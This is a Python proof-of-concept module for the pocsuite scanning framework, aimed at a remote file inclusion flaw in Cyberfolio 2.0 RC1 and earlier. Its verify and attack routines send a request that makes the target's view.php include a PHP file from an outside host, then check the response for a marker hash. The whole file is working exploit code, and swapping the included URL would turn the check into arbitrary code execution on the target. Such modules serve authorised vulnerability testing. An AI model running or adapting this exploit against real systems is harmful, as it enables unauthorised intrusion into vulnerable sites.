#!/usr/bin/env python
# coding: utf-8

import re
from pocsuite.net import req
from pocsuite.poc import Output, POCBase
from pocsuite.utils import register

class Cyberfolio_Remote_File_Include(POCBase):
    vulID = '64221'
    version = '1'
    vulDate = '2006-11-06'
    author = ' '
    createDate = '2015-12-20'
    updateDate = ' '
    references = ['http://www.sebug.net/vuldb/ssvid-64221']
    name = 'Cyberfolio <= 2.0 RC1 (av) Remote File Include Vulnerabilities'
    appPowerLink = ''
    appName = 'Cyberfolio'
    appVersion = '<= 2.0'
    vulType = 'Remote File Inclusion'
    desc = ''
    samples = ['']


    def _attack(self):
        return self._verify()


    def _verify(self):
        result = {}
        vul_url = '%s/portfolio/msg/view.php?av=http://tool.scanv.com/wsl/php_verify.txt?' % self.url
        response = req.get(vul_url).content

        if re.search('d4d7a6b8b3ed8ed86db2ef2cd728d8ec', response):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url

        return self.parse_attack(result)


    def parse_attack(self, result):
        output = Output(self)

        if result:
            output.success(result)
        else:
            output.fail('failed')

        return output

register(Cyberfolio_Remote_File_Include)